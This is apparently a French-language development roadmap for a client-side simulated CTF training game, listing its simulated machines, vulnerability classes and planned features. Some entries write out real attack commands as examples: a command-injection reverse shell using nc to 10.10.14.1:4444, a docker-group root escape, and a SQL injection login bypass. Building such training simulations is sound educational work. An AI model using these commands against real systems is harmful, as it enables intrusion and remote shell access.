# 🗺️ Roadmap — CTF Lab

Tout ce qui a été envisagé comme piste d'amélioration, du plus petit détail au chantier le
plus ambitieux — **en restant strictement dans le cadre du projet de base : terminal simulé
en vanilla JS, sans dépendance, 100% côté client (aucun backend, aucune API externe).**
Rien n'est fait pour l'instant au-delà de la v1 (3 machines, moteur terminal, scoring,
indices à paliers).

> 💡 Pour ajouter une idée : `- [ ]` dans la section qui correspond. Coche-la (`- [x]`) une
> fois livrée.

---

## 🎯 Prochaines priorités (recommandation, ordre effort/valeur croissant)

Vue synthétique de ce qui reste ouvert et vaudrait le coup d'être attaqué ensuite, en
plus de ce qui vient d'être livré dans les dernières passes (`vim`, `nc` bannière + écoute,
reverse shell manuel sur MERIDIAN, `validateMachines` en garde-fou de schéma) :

1. **Machines en pivot** (Phase 2) — chaînage multi-hop, forte valeur pédagogique. Le
   garde-fou de schéma (`validateMachines`) est déjà en place pour sécuriser l'ajout d'une
   machine supplémentaire de ce type.
2. **Extraction JSON pure des machines** (Phase 3) — le schéma de validation existe déjà ;
   il reste à sérialiser proprement les champs regex du privesc pour sortir `machines.js`
   en fichier `.json` séparé.
3. **`vrai parser shell`** (Phase 3) — dette technique qui limite déjà certains scénarios
   (pas de citations imbriquées, pas de `$(...)`) ; utile avant d'enrichir encore les
   familles de vulnérabilités web.
4. **i18n FR/EN** (Phase 3) — gros chantier transverse, à faire une fois le contenu FR
   stabilisé (sinon double la charge de maintenance à chaque nouvelle machine).

> ✅ Livré depuis la dernière revue : **`nc`/reverse shell généralisé** — le schéma
> `machine.altAccess` (`{ path, injectRegex, user }`) parse l'IP/port du callback depuis le
> payload et est désormais réutilisé sur MERIDIAN **et** PHANTOM (voir Phase 2).

---

## ✅ Déjà fait (v1)

- Moteur de terminal vanilla JS (FS virtuel, pipes basiques : grep/sort/wc/head/tail/cut/awk)
- 3 machines complètes (recon → accès → privesc → flag) : NIMBUS (facile), CERBERUS (moyen),
  OBSIDIAN (difficile)
- 3 classes de privesc couvertes : sudo GTFOBins, cron job world-writable, binaire SUID
- Indices à 3 paliers par étape, score, sauvegarde `localStorage`, déblocage progressif

---

## ✅ Phase 1 — Petits trucs, gros rapport effort/valeur (terminée)

- [x] **Autocomplétion Tab** — commandes connues + chemins du FS courant
- [x] **Historique persistant** — actuellement remis à zéro au reload (`localStorage` au lieu
      de `SESSION.history` en mémoire)
- [x] **`Ctrl+L`** pour clear en plus de la commande `clear`
- [x] **Bouton "copier le flag"** au clic sur un flag affiché dans le terminal
- [x] **`reset <machine>`** — permet de rejouer une machine déjà terminée sans tout recharger
- [x] **Chrono par machine** — affichage du temps passé (façon speedrun), stocké dans la save
- [x] **Messages d'erreur plus réalistes** — code de sortie `$?`, `bash: commande : command
      not found` avec le vrai style bash, `sudo` qui compte les tentatives avant lockout
- [x] **`man <commande>`** — vraies pages de manuel courtes pour chaque commande simulée
      (actuellement un message générique)
- [x] **Thème clair / alternatif** — au moins un 2e thème en plus du thème sombre actuel
- [x] **Petit son discret (optionnel, toggle)** à la capture d'un flag

## 📚 Phase 2 — Contenu (plus de machines, plus de variété)

- [x] **Monter à 8-10 machines** avec une vraie courbe de difficulté (Facile → Moyen →
      Difficile → Insane) — 8/8-10 avec VORTEX (IDOR API), MERIDIAN (LFI config leak) et
      AXIOM (Insane, groupe `docker` équivalent root). *Reste ouvert* : 1-2 machines de plus
      pour viser le haut de la fourchette.
- [x] **Nouvelles familles de vulnérabilités**, toujours simulées (pas de vrai service qui
      tourne) :
      - [x] Web : faux login vulnérable à une injection SQL simplifiée (`curl -d`, bypass
        `' OR '1'='1'`), LFI simulée via un paramètre `?page=` → machine **PHANTOM**
      - [x] Un mode `cmd`/PowerShell simulé (`dir`, `type`, `net`, `schtasks`, `icacls`) pour
        une machine "Windows", privesc via tâche planifiée SYSTEM world-writable → machine
        **GLACIER**
      - [x] Un mini scénario conteneur simulé — commande `docker ps` en dur (pas de vrai
        Docker) + privesc via appartenance au groupe `docker` (`docker run -v /:/mnt --rm -it
        alpine chroot /mnt sh`) → machine **AXIOM**
- [ ] **Machines en pivot** — rooter la machine 1 donne accès réseau à une machine 2
      "interne", via un faux tunnel SSH (`ssh -L`) simulé — chaînes d'attaque multi-hop
- [x] **Mode "Insane / sans indices"** — commande `insane on`, pour les joueurs qui veulent un
      run tendu dès le départ : `hint`/`chint` refusent, score multiplié par 1.5 sur toute la
      partie. Verrouillé à une sauvegarde neuve (score à 0, rien de commencé) pour éviter toute
      incohérence de scoring en cours de route — pas de bascule libre en milieu de partie comme
      envisagé à l'origine, choix assumé pour la fiabilité du score.
- [x] **Mode Jeopardy en plus du mode boîte** — mini-challenges indépendants (crypto basique,
      forensics léger, misc) via `challenges`/`challenge <id>`/`chint <id>`/`submit <id> <flag>`,
      score unifié avec le mode boîte. 5 défis pour l'instant (César, Base64 imbriqué, XOR à clé
      unique, casseur de hash, acrostiche) — encore extensible
- [x] **Défi du jour** — commande `daily`, seed = date du jour (calculée en JS pur) qui met en
      avant un des défis Jeopardy existants. *Reste ouvert* : varier aussi les machines en mode
      boîte (pool de vulnérabilités), pas seulement les défis Jeopardy
- [x] **Write-up auto-généré** — une fois une machine terminée, `writeup <machine>` génère un résumé
      pédagogique (recon, accès, privesc, flags) à partir des données de la machine et de la
      progression sauvegardée ; `--download` l'exporte en fichier `.md`
- [x] **Badges/succès** — 🎯 "0 indice utilisé" et ⚡ "moins de 5 minutes" par machine, plus
      🏆 "perfectionniste" et 🌐 "tour complet" en global (commande `badges`, sidebar).
      Variante simplifiée de l'idée d'origine : pas de badge "toutes les machines en une
      session" (nécessiterait de tracker un id de session) — piste encore ouverte.
- [x] **`vim` minimal** — un mini-éditeur modal (`vim`/`vi`/`nano`) à la place du seul `echo >>`
      pour éditer des fichiers : insertion ligne par ligne, `:wq` (enregistrer + quitter),
      `:q!` (quitter sans sauver), `:show` (revoir le buffer). Fonctionne en local (attaquant)
      et sur les machines cibles ; la détection du payload de privesc cron/schtask
      (CERBERUS, GLACIER) a été rendue générique (basée sur le contenu du script plutôt que
      sur la commande exacte tapée) pour que `vim` soit une alternative à part entière à
      `echo '...' >> script.sh`, testé dans `tests/run.js`.
- [x] **`nc` (netcat) simulé** — client (`nc <ip> <port>`, bannière brute) **et** écoute
      (`nc -lvnp <port>`) livrés. Le vrai bind/reverse shell manuel fonctionne maintenant sur
      **MERIDIAN** : `SESSION.listening` retient le port en écoute côté attaquant, et le
      endpoint `/report` (déjà vulnérable en LFI pour l'accès "normal") exécute en réalité le
      paramètre `file` sans échappement — en écoutant sur le bon port puis en déclenchant
      `curl "http://.../report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh"`, le joueur
      obtient le même accès initial que via ssh, mais par injection de commande plutôt que
      fuite d'identifiants. C'est un chemin **bonus, non nécessaire** (les indices ssh restent
      la voie principale ; un 4ᵉ indice optionnel révèle le chemin reverse shell). L'IP
      attaquante est fixe (`ATTACKER_IP = "10.10.14.1"` dans `machines.js`) et le port fixe
      (4444) — pas encore une vraie "modélisation réseau" générique, mais un cas concret qui
      prouve le concept sans backend ni vrai socket. Testé dans `tests/run.js` (refus sans
      écoute, refus sur le mauvais port, accès + crédit du score une seule fois même en
      repassant par ssh ensuite).
- [x] **`nc`/reverse shell généralisé** — le mécanisme n'est plus câblé sur MERIDIAN : le
      schéma `machine.altAccess` est passé de `{ triggerPath, port, user }` (chaîne exacte +
      port fixe) à `{ path, injectRegex, user }`. Le moteur (`cmdCurl`) détecte l'injection de
      commande sur l'endpoint (`path` + `injectRegex` sur la query), **parse l'IP et le port du
      callback depuis le payload du joueur** (au lieu de valeurs codées en dur), exige que l'IP
      soit celle de l'attaquant (`ATTACKER_IP`) et que le port corresponde à l'écoute
      (`nc -lvnp <port>`) — le joueur choisit donc librement son port. Réutilisé tel quel sur
      une 2ᵉ machine, **PHANTOM** (injection via le même paramètre `?page=` que sa LFI), pour
      prouver la généricité. Testé dans `tests/run.js` (port variable 9001, rejet d'une mauvaise
      IP de callback, LFI normale non confondue avec une injection, exploitation complète de
      PHANTOM par ce chemin).
- [ ] **Chapitre "upload de webshell"** *(nouvelle idée)* — un faux formulaire d'upload mal
      filtré (`curl -F` simulé) qui accepte un fichier déguisé, exécuté ensuite via une
      requête vers son chemin — bon candidat pour un second cas d'usage du reverse shell
      généralisé ci-dessus (le webshell "ouvre" une connexion vers le port que le joueur
      écoute avec `nc -lvnp`)
- [ ] **Machine "mauvaise configuration cloud"** *(nouvelle idée)* — simulateur minimal d'un
      bucket de stockage mal configuré (accès public en lecture/écriture) exposé via une
      fausse CLI (`cloudctl ls`/`cloudctl get`/`cloudctl cp`), pour couvrir une classe de
      vulnérabilité très courante sans avoir besoin d'un vrai SDK cloud

## 🔧 Phase 3 — Technique / fiabilité

- [x] **Suite de tests unitaires du moteur** — `tests/run.js` (Node, zéro dépendance) : parsing
      et pipes, exploit complet des 8 machines (recon → accès → privesc → 2 flags), cohérence
      du score, remboursement de `reset`, résolution des défis Jeopardy, mode Insane, éditeur
      `vim` (création/édition/`:q!`, alternative à `echo >>` pour le privesc cron), bannière
      `nc`. 108 assertions au total. Lancer avec `node tests/run.js`. A déjà détecté plusieurs
      erreurs de séquence de commandes pendant son écriture — utile.
- [ ] **Vrai parser shell** — gestion propre des guillemets imbriqués, variables `$VAR`,
      substitution de commande `$(...)`, redirections multiples (`2>`, `&>`) — le parseur
      actuel est volontairement simplifié
- [x] **Versioning de la sauvegarde** — `SAVE_VERSION` explicite + `sanitizeGameState()` centralise
      toutes les migrations (badges, bestTimes, jeopardy, insaneMode...) et normalise n'importe
      quel objet GAME partiel/étranger vers un état sûr. Réutilisé à la fois par le chargement
      normal (`localStorage`) et par l'import de sauvegarde chiffrée (ci-dessous), au lieu de
      deux logiques de migration séparées.
- [~] **Machines déclaratives (JSON pur)** — *premier pas livré* : `validateMachines(MACHINES)`
      (dans `machines.js`) fait office de "petit schéma maison" — vérifie id/ip uniques,
      ports bien formés, `privesc.type` connu, `targetFS`/`rootFile`/`hints` présents. Tourne
      automatiquement au chargement (`engine.js`) et logue dans la console sans jamais
      bloquer le jeu ; testé dans `tests/run.js` (0 erreur sur les 8 vraies machines, et une
      machine volontairement cassée en remonte bien plusieurs). *Reste ouvert* : l'extraction
      réelle en fichier `.json` séparé (actuellement toujours un littéral JS dans
      `machines.js`, ce qui reste plus simple pour les champs regex du privesc — un passage
      en JSON pur demanderait de sérialiser ces regex en chaînes et de les reconstruire au
      chargement).
- [x] **Solveur automatique local** — `tools/solve.js` (Node, dev only, jamais embarqué dans
      le jeu) charge le moteur dans un contexte vm isolé et rejoue la solution officielle de
      chaque machine, en vérifiant les 5 jalons (recon/access/privesc/userFlag/rootFlag) et que
      le flag root récupéré correspond bien à `machine.rootFile.content`. Code de sortie non-nul
      si un chemin d'exploit casse. Options : `--verbose` (chaque commande + sortie du moteur),
      `--walkthrough` (pas-à-pas propre), `--machine <id>` (une seule machine). Complémentaire
      de `tests/run.js` : ici c'est un smoke test dédié aux chemins d'exploit + générateur de
      walkthrough.
- [x] **PWA installable** — manifest + service worker (toujours vanilla) pour jouer hors-ligne
- [ ] **i18n FR/EN** — actuellement tout est codé en dur en français

## 🚀 Phase 4 — Chantiers ambitieux, toujours 100% client / vanilla JS

- [ ] **Éditeur de machines intégré au jeu** — un onglet "Créer une machine" avec un
      formulaire/textarea JSON édité et testé en live dans le navigateur, sans backend ;
      export du résultat en fichier `.js` téléchargeable à glisser dans `machines.js`
- [ ] **Générateur procédural local** — un algorithme JS pur (pas d'IA externe) qui combine
      aléatoirement des "briques" de vulnérabilités (service, faille d'accès, technique de
      privesc) d'un pool prédéfini pour produire de nouvelles machines jouables à la volée
- [ ] **Partage de scénario par URL** — encoder une machine custom ou une session en
      base64 dans le hash de l'URL (`#data=...`), pour partager un scénario ou un replay
      exact sans aucun serveur
- [ ] **Replay local rejouable** — enregistrer la liste des commandes d'une session et
      pouvoir la "rejouer" à l'écran (façon asciinema fait maison, sans dépendance) pour
      vérifier son propre parcours ou en faire un GIF/vidéo côté client
- [ ] **Mode bac à sable libre** — une machine "vierge" où on peut monter n'importe quel FS
      custom (JSON collé par l'utilisateur) pour s'entraîner aux commandes sans notion de
      flag ni de scoring
- [ ] **Vrai mini-langage de script pour les exploits** — remplacer les regex ad-hoc de
      `privesc` par un petit DSL interne (toujours vanilla JS, interprété maison) décrivant
      les conditions d'exploitation, pour rendre l'ajout de nouvelles classes de vulnérabilité
      (au-delà de sudo/cron/SUID) plus simple sans toucher au moteur

## 🤯 Phase 5 — Idées de fou malade (toujours 100% vanilla JS, sans dépendance, sans backend)

- [ ] **Attack graph non-linéaire** — remplacer le chemin figé recon → accès → privesc par un
      vrai graphe de dépendances par machine (plusieurs vulnérabilités d'entrée possibles,
      plusieurs chemins de privesc), avec un rendu SVG interactif du graphe découvert au fur
      et à mesure que le joueur avance (nœuds "grisés" tant qu'ils ne sont pas atteints)
- [ ] **Sous-réseau simulé multi-hôtes** — un faux `nmap 10.10.10.0/24` qui révèle plusieurs
      IP d'un coup, table ARP simulée, et un faux `proxychains`/pivot pour router les commandes
      d'une machine compromise vers une machine interne — version "réseau" plus poussée de
      l'idée pivot déjà en Phase 2
- [ ] **Mode Blue Team** — en plus d'attaquer, un mode où le joueur reçoit un faux dump de logs
      (auth.log, access.log Nginx) et doit répondre à des questions façon SOC (identifier l'IP
      attaquante, l'heure de la compromission, la technique utilisée) — tout généré en dur, pas
      d'IDS réel
- [ ] **Visualiseur de stack pédagogique** — pour une machine "buffer overflow" 100% simulée :
      un schéma animé de la pile (petits blocs mémoire) qui montre comment un `payload` fourni
      par le joueur écrase l'adresse de retour, sans jamais exécuter de code réel — but purement
      pédagogique, aucune primitive d'exploitation binaire réelle
- [x] **Casseur de hash simulé** — commande `hashcat <hash>` / `hashcat --list` en JS pur, contre
      une wordlist embarquée. Utilise un algorithme maison fictif ("hash-VX", pas un vrai MD5/SHA1)
      pour rester clairement pédagogique — intégré au défi Jeopardy "Mot de passe recyclé"
- [ ] **Arbre de compétences façon RPG** — XP gagnée par machine/catégorie (recon, exploitation,
      privesc, forensic) qui débloque progressivement des commandes ou options avancées
      (ex: `nmap -sV`, `awk` avancé) plutôt que tout disponible dès le début.
      *Première brique posée* : le score se traduit déjà en niveau/barre XP dans l'en-tête
      (`levelInfo()` dans `engine.js`) — il manque encore le déblocage de commandes par palier.
- [ ] **Mini reverse engineering** — un faux binaire "malware" à analyser avec un `strings`
      simulé et un désassembleur ultra-simplifié maison (mnémoniques inventés ou x86 minimal
      en dur, pas un vrai moteur de désassemblage) pour un chapitre forensic/malware
- [ ] **Terminal multi-panes façon tmux** — split horizontal/vertical simulé au sein d'un même
      onglet (un pane shell, un pane logs qui défile) pour les machines plus avancées
- [ ] **Mode "fantôme" sur le replay** — en s'appuyant sur le replay local déjà prévu en Phase 4 :
      importer le replay d'un run (le sien ou un fichier partagé) et le rejouer en parallèle du
      run courant façon "ghost" speedrun, sans aucun serveur ni classement en ligne
- [ ] **Hot-seat local** — plusieurs profils de joueur sur le même navigateur/écran, qui jouent
      à tour de rôle sur la même session de machines avec un classement local comparatif —
      explicitement pas de multijoueur réseau, juste plusieurs saves locales comparées
- [x] **Accessibilité poussée** — thème contraste élevé, cartes de machines navigables au clavier
      (Tab + Entrée), `role="log"`/`aria-live` sur le terminal, `aria-label` sur l'input et les
      badges. *Reste ouvert* : compatibilité lecteur d'écran plus poussée sur le pager (`!sh`) et
      les toasts.

## 🌀 Phase 6 — Encore plus loin (vague 2)

- [x] **Lore transversal** — un fil narratif léger reliant les 8 machines (une auditrice interne,
      R. Kade, disparaît en pleine investigation d'une fraude chez "Solenne Holdings" ; un fichier
      `note_interne.txt` par machine avance discrètement l'histoire, jusqu'à un journal final sur
      AXIOM). Aucun impact sur le gameplay — pur easter egg dans les données de `machines.js`.
- [x] **Mini-challenges crypto en Jeopardy** — César, XOR à clé unique et Base64 imbriqué sont
      livrés (voir Phase 2). Un RSA jouet avec petits nombres (factorisation de n=3233, `BigInt`
      pour reproduire les calculs) est également livré (`rsatoy`, catégorie Crypto).
- [x] **Stéganographie simulée** — un faux fichier image avec des métadonnées "EXIF" cachées
      dans un objet JS (pas de vrai binaire image à parser), pour un mini-challenge forensic :
      livré en Jeopardy (`exifhidden`, catégorie Forensics — un champ `UserComment` inversé
      cache le flag).
- [x] **API REST vulnérable simulée** — un faux endpoint `/api/users/<id>` en dur avec IDOR
      simulé (changer l'`id` révèle des données d'un autre "utilisateur" fictif, dont un mot de
      passe admin) : déjà livré via la machine **VORTEX** (voir Phase 2).
- [x] **Ambiance sonore procédurale** — un fond sonore généré par oscillateurs Web Audio API
      (pas de fichier audio à charger, donc zéro dépendance), différent par machine selon la
      difficulté, avec toggle marche/arrêt (bouton 🎧 dans l'en-tête, désactivé par défaut) — à
      ne pas confondre avec le petit son de capture de flag déjà prévu en Phase 1, ici c'est une
      ambiance continue qui change de preset selon la machine courante.
- [ ] **Time machine de session** — undo/redo de l'état du FS courant à l'intérieur d'une
      machine (pas du game state global), pour explorer/tester des commandes destructrices
      sans avoir à tout recharger

⚠️ **Idée évoquée puis écartée dans cette vague** : un export "rapport de pentest en PDF".
Impossible à faire proprement en vanilla JS sans lib externe type jsPDF (contredit le
principe zéro-dépendance) — alternative conforme au cadre : une page dédiée avec une feuille
de style `@media print`, générée et stylée en interne, exportée via le `window.print()` /
"Enregistrer en PDF" natif du navigateur. Cette alternative est ajoutée ci-dessus dans une
future revue si tu valides le principe.

## 🎆 Phase 7 — Encore plus loin (vague 3)

- [ ] **Firewall simulé en CLI** — un faux `iptables -L` / règles pfSense-like à lire et
      modifier en ligne de commande sur une machine réseau avancée (bloquer un port, ajouter
      une règle NAT simulée) — purement textuel, aucun vrai pare-feu ni service réseau
- [x] **Fiche CVE/CVSS pédagogique** — à chaque flag root capturé, une petite fiche
      récapitulative façon CVE fictive s'affiche dans le terminal (CVE générée localement,
      score/vecteur CVSS mappés au type de privesc de la machine)
- [ ] **Mini chapitre phishing** — analyser un faux mail (en-têtes simulés, lien suspect,
      domaine usurpé) pour repérer les indicateurs d'une tentative de phishing, en
      complément du mode Blue Team (Phase 5) mais côté "boîte mail" plutôt que logs serveur
- [x] **Narration vocale des indices** — lecture à voix haute des indices/messages via l'API
      native `SpeechSynthesis` du navigateur (zéro dépendance, zéro fichier audio), togglable
      via le bouton 🗣️ dans l'en-tête (désactivé par défaut). Lit les indices (`hint`/`chint`)
      et les messages importants (flags capturés, badges débloqués, machine débloquée) — jamais
      les listings bruts (`ls`, `cat`, `nmap`...).
- [x] **Export/import de sauvegarde chiffrée** — `export <passphrase>` télécharge un
      `.json.enc` (AES-GCM, clé dérivée par PBKDF2-SHA256 via l'API native `Web Crypto`,
      zéro dépendance), `import` ouvre un sélecteur de fichier puis demande la passphrase.
      Permet de transférer sa progression d'un navigateur à l'autre sans backend.
- [x] **Catégories de speedrun** — en plus du chrono simple par machine (Phase 1), la commande
      `records` compare les meilleurs temps locaux par catégorie ("Any%", "Sans indice", "Premier
      essai sudo") dans un petit tableau stocké en local (`GAME.bestTimes`)
- [x] **Effet visuel de capture de flag** — explosion de particules en Canvas pur au moment
      où le flag root est validé, togglable via le bouton ✨ (FX) dans l'en-tête, avec en
      prime un mode glow/scanlines sur tout le terminal quand les FX sont actives

---

## ❌ Explicitement hors cadre

Des idées plus grosses ont été évoquées à tort dans une version précédente de ce fichier —
elles contredisent le principe de base (vanilla JS, sans dépendance, 100% client) et ne
seront pas poursuivies sauf si tu changes explicitement les règles du projet : un vrai
noyau Linux compilé en WASM, un vrai backend avec de vrais conteneurs Docker par joueur, un
mode multijoueur réseau temps réel, un générateur de machines par IA externe, ou une
distribution en CLI/npx.
